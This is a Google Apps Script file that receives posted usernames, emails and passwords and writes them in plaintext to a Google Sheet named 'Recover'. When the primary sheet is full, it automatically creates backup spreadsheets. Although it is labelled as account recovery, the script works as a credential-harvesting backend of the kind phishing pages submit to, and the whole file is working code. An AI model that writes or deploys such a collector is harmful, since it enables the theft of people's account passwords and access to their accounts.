const SPREADSHEET_ID = '1_phLIubm34UI6FtPeGQRtgtibRlliipwYI1updMPGdA';
const SHEET_NAME = 'Recover';

function doGet(e) {
  return jsonResponse({
    status: 'ok',
    message: 'Apps Script endpoint is ready.'
  });
}

function doPost(e) {
  try {
    const params = e.parameter || {};
    const username = sanitize(params.username || params.accountUsername || '');
    const email = sanitize(params.email || '');
    const password = sanitize(params.password || '');

    if (!username || !email || !password) {
      throw new Error('Please provide username, email, and password.');
    }

    const sheet = SpreadsheetApp.openById(SPREADSHEET_ID).getSheetByName(SHEET_NAME);
    if (!sheet) {
      throw new Error(`Sheet '${SHEET_NAME}' not found in spreadsheet.`);
    }

    try {
      sheet.appendRow([new Date(), username, email, password]);

      return jsonResponse({
        status: 'success',
        message: 'Recovery entry saved.'
      });
    } catch (appendError) {
      const msg = (appendError && appendError.message) ? appendError.message.toLowerCase() : '';

      // Fallback: if the spreadsheet can't be modified (likely too large), create a backup spreadsheet and save the row there
      if (msg.includes('cannot be modified') || msg.includes('grown too large') || msg.includes('too large')) {
        try {
          const backupId = createBackupSpreadsheetAndAppend([new Date(), username, email, password]);
          const backupUrl = `https://docs.google.com/spreadsheets/d/${backupId}`;
          return jsonResponse({
            status: 'success',
            message: 'Primary sheet is full — saved to backup: ' + backupUrl
          });
        } catch (backupErr) {
          return jsonResponse({
            status: 'error',
            message: 'Failed to save to primary sheet and backup creation failed: ' + (backupErr.message || backupErr)
          });
        }
      }

      // If it's a different append error, rethrow to be handled by outer catch
      throw appendError;
    }
  } catch (error) {
    return jsonResponse({
      status: 'error',
      message: error.message || 'Unknown error'
    });
  }
}

function jsonResponse(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}

function sanitize(value) {
  return typeof value === 'string' ? value.trim() : value;
}

/**
 * Create a backup spreadsheet and append the provided row.
 * Returns the new spreadsheet ID.
 */
function createBackupSpreadsheetAndAppend(row) {
  const name = 'Recover Backup ' + Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyy-MM-dd HH:mm:ss');
  const ss = SpreadsheetApp.create(name);
  const sh = ss.getActiveSheet();
  // Add header row for clarity
  sh.appendRow(['Timestamp', 'Username', 'Email', 'Password']);
  sh.appendRow(row);
  return ss.getId();
}
